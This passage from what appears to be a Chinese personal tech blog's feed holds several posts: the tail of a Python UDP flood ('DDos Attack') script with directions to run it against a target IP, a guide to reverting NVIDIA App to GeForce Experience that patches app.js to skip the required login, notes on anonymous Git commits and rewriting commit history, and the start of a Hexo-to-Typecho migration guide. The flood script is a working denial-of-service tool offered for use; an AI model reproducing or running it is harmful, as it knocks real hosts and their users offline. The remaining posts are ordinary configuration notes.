class="comment"># 修改处</span></span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[===============     ] 75%&quot;</span>) <span class="comment"># 修改处</span></span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[====================] 100%&quot;</span>) <span class="comment"># 修改处</span></span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line">sent = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">     sock.sendto(<span class="built_in">bytes</span>, (ip,port))</span><br><span class="line">     sent = sent + <span class="number">1</span></span><br><span class="line">     port = port + <span class="number">1</span></span><br><span class="line">     <span class="built_in">print</span> (<span class="string">&quot;Sent %s packet to %s throught port:%s&quot;</span>%(sent,ip,port))</span><br><span class="line">     <span class="keyword">if</span> port == <span class="number">65534</span>:</span><br><span class="line">       port = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>随后在该目录下执行文件（Python2 的把<code>3</code>去掉）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Python3 ddos-attack.py</span><br></pre></td></tr></table></figure><p>如果输出界面显示<code>DDos Attack</code>大字且下方无报错，则大致没有问题。</p><p>在下方输入攻击对象的 IP（不知道的可使用 Ping 命令获取），回车后输入 Port（线程数，建议 80 到 100，数值越高，耗能也越大，效果也会越好，电脑越容易卡死）。再次按下回车，等待程序加载，随后命令窗口滚动 Sent，表明攻击开始执行。</p><p>退出直接按 Ctrl+C 即可</p>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NvidiaApp 如何回退到 GFE</title>
      <link href="/posts/2807863529/"/>
      <url>/posts/2807863529/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>我感觉 NVIDIA APP 在我的电脑上“水土不服”。虽然界面是更高级了（但感觉也差不多），但我只想用它来更新驱动。因此我打算换回 GFE。</p><h2 id="安装回-GeForce-Experience">安装回 GeForce Experience</h2><p>首先先卸载 NVIDIA APP，用任何方式都可以。之后去下载 GFE 的安装包。</p><p>NVIDIA 官网 GEF 下载地址已不见踪影，但还有一篇文章中保留了它：<a href="https://www.nvidia.cn/geforce/geforce-experience/faq/" rel="external nofollow noreferrer">GeForce Experience 常见问题解答</a>。在此文章中找到<code>下载</code>按钮，即可获得 GFE 的安装文件。</p><p>下载完后进行安装。如果安装后发现其提示“GeForce Experience 需要进行更新”，记得千万不要重启，否则 NVIDIA APP 会重新回来。此时桌面上会有它的图标，对其<code>右键</code>-&gt;<code>打开文件所在位置</code>，进入安装目录。该目录一般为<code>C:\Program Files\NVIDIA Corporation\NVIDIA GeForce Experience</code>。</p><p>该目录下有<code>NVIDIA GeForce Experience.json</code>文件，找到并删除下面这一行：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;nv-self-update-path=Downloader\\gfeupdate.json&quot;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><p>如果发现保存不了（提示权限问题），可以对该文件<code>右键</code>-&gt;<code>属性</code>-&gt;<code>安全</code>，点击<code>编辑</code>按钮，将“组或用户名”中你所在的选项选中（实在不行就都选，改完后再调回来），在下方“XXX 的权限”那里将所有“允许”的选项框都勾选，并点击<code>应用</code>按钮。</p><p>保存后重启 GFE，软件更新提示便消失了。</p><h2 id="防止自动更新到-NVIDIA-APP">防止自动更新到 NVIDIA APP</h2><p>GFE 有时会弹出一个框，告知用户是否升级 NVIDIA APP。虽然可以选择暂不，GFE 使用不受影响，但这个窗口要先加载完才能点“暂不”，而且每次它都“贴心”地下载好了安装文件。</p><p>我不确定是不是所有设备都有这个，因此需要根据自己的情况来进行修改。</p><p>接下来，进入<code>C:\ProgramData\NVIDIA Corporation\Downloader</code>目录，找到<code>gfeupdate.json</code>（这里面记录了 NVIDIA APP 安装程序所在目录，一般只有一行）。将文件中内容全部删除，然后对此文件<code>右键</code>-&gt;<code>属性</code>，将下方“只读”选项卡勾选，然后点击<code>应用</code>按钮。</p><p>如果配置有效，则之后再启动 GFE，就没有提示更新至 NVIDIA APP 的窗口，而是直接打开 GFE 本体。</p><h2 id="绕过登录">绕过登录</h2><p>NVIDIA APP 不需要强制登录才能使用，但 GFE 要。但我就拿它来更新个驱动，为什么要费这么大劲呢？而且它的登录服务器还不一定稳定……</p><p>首先退出 GFE，并且任务管理器确保它所有的进程都已结束。随后找到并编辑<code>C:\Program Files\NVIDIA Corporation\NVIDIA GeForce Experience\www</code>目录中<code>app.js</code>文件（实际修改时，里面的东西不要格式化，）。建议使用支持正则表达式匹配的编辑器。</p><p>之后，使用正则表达式搜索代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;choose&quot;===\w\.nvActiveAuthView[\D]*\)\&#125;</span><br></pre></td></tr></table></figure><p>（其中的<code>[\D]*</code>考虑了 GFE 不同版本代码的细微变化，例如有些版本是<code>&quot;choose&quot;===S.nvActiveAuthView</code>）</p><p>找到这个代码之后，在其往后的第一个<code>&#125;</code>后添加（任何GFE版本都一样，不随版本变化）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">;<span class="variable language_">this</span>.<span class="title function_">handleLoggedIn</span>(&#123;</span><br><span class="line">    <span class="attr">sessionToken</span>:<span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">userToken</span>:<span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">user</span>: &#123;</span><br><span class="line">        <span class="attr">core</span>:&#123;</span><br><span class="line">            <span class="attr">displayName</span>:<span class="string">&quot;匿名&quot;</span>,</span><br><span class="line">            <span class="attr">primaryEmailVerified</span>: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 粘贴时可以压缩为一行</span></span><br></pre></td></tr></table></figure><p>然后使用正则表达式搜索代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\w\.selectView\(\)\&#125;,\w\.selectView=function\(\)\&#123;</span><br></pre></td></tr></table></figure><p>并将内容替换为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return</span><br></pre></td></tr></table></figure><p>之后保存文件，完成修改。</p>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序 </tag>
            
            <tag> 代码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git 如何实现匿名提交</title>
      <link href="/posts/3659036632/"/>
      <url>/posts/3659036632/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>说明：本文为学习 Git 时记录而用，不应被视为教程</p></blockquote><blockquote><p>如果想要更深入地学习 Git，建议看<a href="https://liaoxuefeng.com/books/git/introduction/index.html" rel="external nofollow noreferrer">Git 教程（廖雪峰）</a>、<a href="https://www.runoob.com/git/git-tutorial.html" rel="external nofollow noreferrer">Git 教程（菜鸟教程）</a>、<a href="https://git-scm.com/book/zh/v2" rel="external nofollow noreferrer">Git Book（官方文档）</a></p></blockquote><p>有时候为了提交一些测试性的代码，又或是因项目本身的原因而不便公开自己的信息。</p><p>我需要一个能够匿名提交的方法。</p><h2 id="配置优先级">配置优先级</h2><p>Git 提供了三个配置级别：</p><ul><li>系统级别（system）：位于 /etc/gitconfig，使用 --system 选项来读写此文件。对所有用户都适用，默认配置项也在这里</li><li>全局级别（global）：位于 ~/.gitconfig 或 ~/.config/git/config，使用 --global 选项来读写此文件。只适用于登录用户，对当前用户而言的全局级别</li><li>仓库级别（local）：位于当前仓库的 .git/config，默认情况下 Git 使用此文件，也可使用 --local 选项来读写。只适用于当前仓库，用于对不同的仓库自定义配置</li></ul><p>这三个级别配置的内容都是相同的，而优先级不同。配置的优先级由高到低依次为：<code>仓库级别</code> &gt; <code>全局级别</code> &gt; <code>系统级别</code>。也就是说，如果存在同名配置，则按照此顺序覆盖。</p><h2 id="当前仓库匿名">当前仓库匿名</h2><p>Git 配置文件<code>.git/config</code>是一个存储在 Git 仓库中的配置文件，用于定义该仓库的特定设置。Git 使用 git config 工具来管理这些配置变量，这些变量可以控制 Git 的外观和操作行为。</p><p>先进入目标仓库并打开 Git，执行命令查看当前的用户信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --<span class="built_in">local</span> user.name   <span class="comment"># 检查本地用户名</span></span><br><span class="line">git config --<span class="built_in">local</span> user.email  <span class="comment"># 检查本地邮箱</span></span><br></pre></td></tr></table></figure><p>如果没有信息，则表明当前仓库无自定义用户信息。可通过下面的代码设置自定义用户名与邮箱，它们只对当前仓库生效：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --<span class="built_in">local</span> user.name <span class="string">&quot;Anonymous&quot;</span></span><br><span class="line">git config --<span class="built_in">local</span> user.email <span class="string">&quot;anonymous@example.com&quot;</span></span><br></pre></td></tr></table></figure><p>之后，检测配置优先级：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --list --show-origin | grep user</span><br></pre></td></tr></table></figure><p>确认 <a href="http://user.name" rel="external nofollow noreferrer">user.name</a> 和 user.email 的配置来源是当前仓库的 .git/config 文件（它的优先级最高）。如果全局配置覆盖了本地，可能输出就是这个样子的（类似）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file:/home/user/.gitconfig  user.name=YourGlobalName</span><br><span class="line">file:.git/config            user.name=Anonymous  <span class="comment"># 此项本应优先生效，但此处因配置失误而未能优先</span></span><br></pre></td></tr></table></figure><p>如果你设置的新邮箱已关联 GitHub 账户，那么提交仍会关联到你的账户（如果使用 GitHub Desktop 时用了它自动设置的邮箱，也可能会关联）。此时，你应该使用完全未注册过 GitHub 的邮箱（如示例中的<code>anonymous@example.com</code>）。随后进入 GitHub 网站，在设置中取消该邮箱的关联（<code>Settings</code> -&gt; <code>Emails</code> -&gt; 取消勾选“Keep my email addresses private”和“Block command line pushes…”之类字样）。</p><p>如果配置生效，则下一次在该仓库提交代码时，提交者信息会更新为刚才设置的信息。</p><p>也可以检测当前仓库的<code>.git/config</code>文件，查看相关配置项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[user]</span><br><span class="line">    name = Anonymous</span><br><span class="line">    email = anonymous@example.com</span><br></pre></td></tr></table></figure><p>如果是敏感项目，还可以尝试这个命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global alias.clone-anon <span class="string">&#x27;!f()&#123; git clone $1 &amp;&amp; cd $(basename $1 .git) &amp;&amp; git config user.name &quot;Anonymous&quot; &amp;&amp; git config user.email &quot;anon@example.com&quot;; &#125;; f&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Hook">Hook</h2><blockquote><p>注：该部分配置我暂未成功生效。折腾不明白的，还是手动用命令修改。</p></blockquote><p>传统的 git config 方法有三个主要缺点：</p><ul><li>容易被全局配置覆盖</li><li>依赖人工记忆设置</li><li>无法修改历史提交</li></ul><p>不过，Git 允许我们设置 Hook 脚本，用于在特定事件发生时执行自定义操作。相比于传统方法，它有几个特点：</p><ul><li>自动化：提交前自动设置身份</li><li>强制化：不受其他配置影响</li><li>本地化：无需共享敏感信息</li></ul><p>首先进入当前仓库的<code>.git/hooks</code>目录（可能被隐藏，Win 的话记得勾选“隐藏的项目”），在此处使用 Git执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano pre-commit</span><br></pre></td></tr></table></figure><p>之后编辑该文件，输入以下内容并保存：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置匿名身份</span></span><br><span class="line">export GIT_AUTHOR_NAME=&quot;Anonymous&quot;</span><br><span class="line">export GIT_AUTHOR_EMAIL=&quot;anonymous@example.com&quot;</span><br><span class="line">export GIT_COMMITTER_NAME=&quot;Anonymous&quot;</span><br><span class="line">export GIT_COMMITTER_EMAIL=&quot;anonymous@example.com&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">保留原始钩子功能（如有）</span></span><br><span class="line">if [ -f .git/hooks/pre-commit.original ]; then</span><br><span class="line">  ./.git/hooks/pre-commit.original</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>记得设置权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x pre-commit</span><br></pre></td></tr></table></figure><p>随后验证配置是否生效：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git commit --allow-empty -m <span class="string">&quot;Test&quot;</span></span><br><span class="line">git <span class="built_in">log</span> -1 --pretty=format:<span class="string">&quot;Author: %an &lt;%ae&gt;%nCommitter: %cn &lt;%ce&gt;&quot;</span></span><br></pre></td></tr></table></figure><p>如果配置生效，应显示如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Author: Anonymous &lt;anonymous@example.com&gt;</span><br><span class="line">Committer: Anonymous &lt;anonymous@example.com&gt;</span><br></pre></td></tr></table></figure><p>这样，Git 将会在每次提交前自动设置匿名提交者信息。也可以创建一个测试文件并提交：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> test.txt</span><br><span class="line">git add hook_test.txt</span><br><span class="line">git commit -m <span class="string">&quot;Testing pre-commit hook&quot;</span></span><br></pre></td></tr></table></figure><p>如果发现<code>.git/hooks</code>目录不被版本控制（hook不共享），那么可以将hook存储在项目目录中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在项目根目录创建hooks文件夹</span></span><br><span class="line"><span class="built_in">mkdir</span> -p hooks</span><br><span class="line"><span class="built_in">mv</span> .git/hooks/pre-commit hooks/pre-commit-template</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加安装脚本</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/bin/sh</span></span><br><span class="line"><span class="string">cp hooks/pre-commit-template .git/hooks/pre-commit</span></span><br><span class="line"><span class="string">chmod +x .git/hooks/pre-commit&#x27;</span> &gt; setup-anon-hook.sh</span><br></pre></td></tr></table></figure><p>当然，在前面编辑文件那一步，也可以用其他方法，例如基于时间戳生成随机身份：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">TIMESTAMP=$(date +%s)</span><br><span class="line">export GIT_AUTHOR_NAME=&quot;anon_$TIMESTAMP&quot;</span><br><span class="line">export GIT_AUTHOR_EMAIL=&quot;anon_$TIMESTAMP@example.com&quot;</span><br><span class="line">export GIT_COMMITTER_NAME=&quot;$GIT_AUTHOR_NAME&quot;</span><br><span class="line">export GIT_COMMITTER_EMAIL=&quot;$GIT_AUTHOR_EMAIL&quot;</span><br></pre></td></tr></table></figure><p>又或是忽略特定分支：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不在main分支使用匿名身份</span></span><br><span class="line">CURRENT_BRANCH=$(git branch --show-current)</span><br><span class="line"></span><br><span class="line">if [ &quot;$CURRENT_BRANCH&quot; = &quot;main&quot; ]; then</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">退出钩子，使用正常身份</span></span><br><span class="line">  exit 0</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">export GIT_AUTHOR_NAME=&quot;Anonymous&quot;</span><br><span class="line">export GIT_AUTHOR_EMAIL=&quot;anonymous@example.com&quot;</span><br><span class="line">export GIT_COMMITTER_NAME=&quot;$GIT_AUTHOR_NAME&quot;</span><br><span class="line">export GIT_COMMITTER_EMAIL=&quot;$GIT_AUTHOR_EMAIL&quot;</span><br></pre></td></tr></table></figure><h2 id="修改提交历史">修改提交历史</h2><p>提醒：修改提交记录是破坏性操作，务必先备份，以防万一！</p><p>创建完整仓库备份：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --mirror repo-url repo-backup</span><br><span class="line"><span class="built_in">cd</span> repo-backup</span><br><span class="line">git bundle create ../repo-backup.bundle --all</span><br></pre></td></tr></table></figure><p>清除历史提交身份：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注意引号</span></span><br><span class="line">git filter-branch --env-filter <span class="string">&#x27;</span></span><br><span class="line"><span class="string">  export GIT_AUTHOR_NAME=&quot;Anonymous&quot;</span></span><br><span class="line"><span class="string">  export GIT_AUTHOR_EMAIL=&quot;anonymous@example.com&quot;</span></span><br><span class="line"><span class="string">  export GIT_COMMITTER_NAME=&quot;$GIT_AUTHOR_NAME&quot;</span></span><br><span class="line"><span class="string">  export GIT_COMMITTER_EMAIL=&quot;$GIT_AUTHOR_EMAIL&quot;</span></span><br><span class="line"><span class="string">  &#x27;</span> --tag-name-filter <span class="built_in">cat</span> -- --all</span><br></pre></td></tr></table></figure><p>觉得麻烦可以写一个脚本完成：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置新身份信息</span></span><br><span class="line">NEW_NAME=&quot;AnonymousContributor&quot;</span><br><span class="line">NEW_EMAIL=&quot;anonymous@example.com&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置要替换的旧邮箱</span></span><br><span class="line">OLD_EMAILS=(</span><br><span class="line">    &quot;your.real.email@company.com&quot;</span><br><span class="line">    &quot;personal.email@gmail.com&quot;</span><br><span class="line">    # 可以添加更多邮箱...</span><br><span class="line">)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成邮箱的匹配条件</span></span><br><span class="line">EMAIL_CONDITION=&quot;&quot;</span><br><span class="line">for email in &quot;$&#123;OLD_EMAILS[@]&#125;&quot;; do</span><br><span class="line">    [ -n &quot;$EMAIL_CONDITION&quot; ] &amp;&amp; EMAIL_CONDITION+=&quot; || &quot;</span><br><span class="line">    EMAIL_CONDITION+=&quot;\&quot;\$GIT_COMMITTER_EMAIL\&quot; = &#x27;$email&#x27; || \&quot;\$GIT_AUTHOR_EMAIL\&quot; = &#x27;$email&#x27;&quot;</span><br><span class="line">done</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行</span></span><br><span class="line">git filter-branch --env-filter &#x27;</span><br><span class="line">    if [ &#x27;&quot;$EMAIL_CONDITION&quot;&#x27; ]; then</span><br><span class="line">        # 替换作者信息</span><br><span class="line">        export GIT_AUTHOR_NAME=&quot;&#x27;&quot;$NEW_NAME&quot;&#x27;&quot;</span><br><span class="line">        export GIT_AUTHOR_EMAIL=&quot;&#x27;&quot;$NEW_EMAIL&quot;&#x27;&quot;</span><br><span class="line">        </span><br><span class="line">        # 替换提交者信息</span><br><span class="line">        export GIT_COMMITTER_NAME=&quot;&#x27;&quot;$NEW_NAME&quot;&#x27;&quot;</span><br><span class="line">        export GIT_COMMITTER_EMAIL=&quot;&#x27;&quot;$NEW_EMAIL&quot;&#x27;&quot;</span><br><span class="line">    fi</span><br><span class="line">&#x27; --tag-name-filter cat -- --all</span><br></pre></td></tr></table></figure><p>之后清理旧的引用数据：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git for-each-ref --format=<span class="string">&quot;%(refname)&quot;</span> refs/original/ | xargs -n 1 git update-ref -d</span><br><span class="line"></span><br><span class="line">git reflog expire --expire=now --all</span><br><span class="line">git gc --prune=now --aggressive</span><br></pre></td></tr></table></figure><p>然后强制推送所有分支和标签：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git push --force --all</span><br><span class="line">git push --force --tags</span><br></pre></td></tr></table></figure><p>完成后，检查一下修改情况：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span> --graph --oneline --decorate --all</span><br></pre></td></tr></table></figure><p>此外，还可以检查检查特定日期的提交：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span> --since=<span class="string">&quot;2018-01-01&quot;</span> --pretty=format:<span class="string">&quot;%h - %an &lt;%ae&gt;&quot;</span></span><br></pre></td></tr></table></figure><p>或是搜索旧邮箱是否残留（后缀）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span> --all --grep=<span class="string">&quot;@example.com&quot;</span> --grep=<span class="string">&quot;@gmail.com&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 摘录笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
            <tag> 命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何从 Hexo 迁移到 Typecho</title>
      <link href="/posts/1183868867/"/>
      <url>/posts/1183868867/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>最开始选择用 Hexo 搭建网站，看中的是它可以实现低成本建站的特点。虽然成本是下来了，但修改文章、评论、微调等变得麻烦了。想起来以前注册了个 Serv00 虚拟主机，于是想试试 Typecho。</p><p>但问题是，Typecho 还没有一键导入 md 的功能；手动复制粘贴又显得低效。搜寻后，决定使用插件完成。</p><h2 id="插件">插件</h2><p>这里，我们使用 <a href="https://github.com/zhghg/hexo-2-typecho" rel="external nofollow noreferrer">hexo-2-typecho</a> 插件，它可以在执行<code>hexo g</code>命令时生成<code>contents.sql</code>、<code>metas.sql</code>、<code>relationships.sql</code>三张表，将 Typecho 基本要用的数据都转过来了。</p><p>在 Hexo 项目根目录中，执行命令安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i hexo-2-typecho --save</span><br></pre></td></tr></table></figure><p>按照文档所述，默认情况下：</p><ul><li>typecho 的 authorId 为 1</li><li>typecho 的 cid 和 mid 均为 10</li><li>hexo 图片的默认保存位置是 source 文件下的 images 文件夹中</li></ul><p>出现下列情况时，需要修改 Hexo 的<code>_config.yml</code>：</p><ul><li>你的 typecho 有多个用户的情况下，你可以查看 typecho 数据库，选出一个作者 id。</li><li>你的 typecho 已经写了不少博客，你需要查看 typecho 中 cid 和 mid 最大值是多少，然后将配置的 cid 和 mid 分别+1。</li><li>使用 hexo-admin 写作图片一般保存在 images 文件夹中，如果你的图片存在别的文件夹下，则需要修改。另外，目前不支持文件夹下再挂文件夹的情况。</li></ul><p>在<code>_config.yml</code>中增加以下配置，修改对应值即可：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">typecho:</span></span><br><span class="line"> <span class="attr">authorId:</span> <span class="number">1</span></span><br><span class="line"> <span class="attr">images:</span> <span class="string">&#x27;images&#x27;</span></span><br><span class="line"> <span class="attr">mid:</span> <span class="number">10</span></span><br><span class="line"> <span class="attr">cid:</span> <span class="number">10</span></span><br></pre></td></tr></table></figure><p>不过，对于一个全新安装、没有准备过往数据的 Typecho 站点而言，初次导入时可以不管这些配置。</p><h2 id="生成与导入">生成与导入</h2><p>执行生成命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure><p>等待完成后，Hexo 根目录下会出现名为<code>typecho</code>的目录，里面是转换后的数据。有些表需要自行编辑，按照实际情况修改字段（例如<code>contents.sql</code>中，<code>t_contents</code>需要根据你安装时设置的表前缀进行调整）。</p><p>插件作者的建议是：</p><blockquote><p>使用<code>usr</code>文件夹覆盖 Typecho 中的<code>usr</code>文件夹。</p><p>使用 <code>Navicat</code> 将 json 数据导入到 typecho 中对应的表，当然你也可以使用别的软件，但是我还是建议你使用 <code>Navicat</code>。</p><p>SQL 文件导入<br>这是最新加入的功能，最新版本生成了 SQL 文件，你可以直接将上边的三个 SQL 文件导入数据库。</p><p>使用 sql 文件直接写入数据库时，请注意调整 <code>max_allowed_packet</code> 参数，否则会报 2006 错误。</p></blockquote><p>受限于虚拟主机的权限，追求方便，我选择使用 phpMyAdmin 完成。</p><p>登入 phpMyAdmin，左侧树状列表大概是这样的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">【数据库名称】</span><br><span class="line">├── typecho_comments</span><br><span class="line">├── typecho_contents</span><br><span class="line">├── typecho_fields</span><br><span class="line">├── typecho_metas</span><br><span class="line">├── typecho_options</span><br><span class="line">├── typecho_relationships</span><br><span class="line">└── typecho_users</span><br></pre></td></tr></table></figure><p>没有配置其他参数时，这里只需将<code>contents.sql</code>、<code>metas.sql</code>、<code>relationships.sql</code>，分别导入 typecho_contents、typecho_metas、typecho_relationships 